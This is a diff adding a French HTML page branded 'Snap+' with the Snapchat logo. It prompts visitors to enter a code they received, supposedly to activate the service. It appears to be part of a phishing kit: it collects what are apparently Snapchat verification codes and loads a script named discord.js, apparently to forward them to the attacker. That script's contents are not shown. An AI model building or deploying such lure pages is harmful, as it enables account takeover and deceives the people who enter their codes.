@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Snap+ - Code</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="main-content">
+            <div class="snap-banner">
+                <i class="fab fa-snapchat"></i>
+                <h2>Snap+</h2>
+            </div>
+
+            <div class="disclaimer">
+                <i class="fas fa-exclamation-triangle"></i>
+                <p>Entrez le code que vous avez reçu pour activer votre Snap+.</p>
+            </div>
+
+            <div class="headline">
+                Entrez votre code 🔐
+            </div>
+
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <i class="fas fa-key"></i>
+                    <input type="text" id="codeInput" placeholder="Entrez le code reçu" maxlength="10">
+                </div>
+            </div>
+
+            <button class="submit-btn" id="sendBtn">
+                <i class="fas fa-paper-plane"></i> Envoyer
+            </button>
+
+            <div class="loading-screen" id="loadingScreen">
+                <div class="spinner"></div>
+                <div class="loading-text">Envoi en cours...</div>
+            </div>
+
+            <div class="success-message" id="successMessage">
+                <i class="fas fa-check-circle"></i>
+                <h3>Code envoyé !</h3>
+                <p>Votre code a bien été envoyé.</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="discord.js"></script>
+    <script src="code.js"></script>
+</body>
+</html>
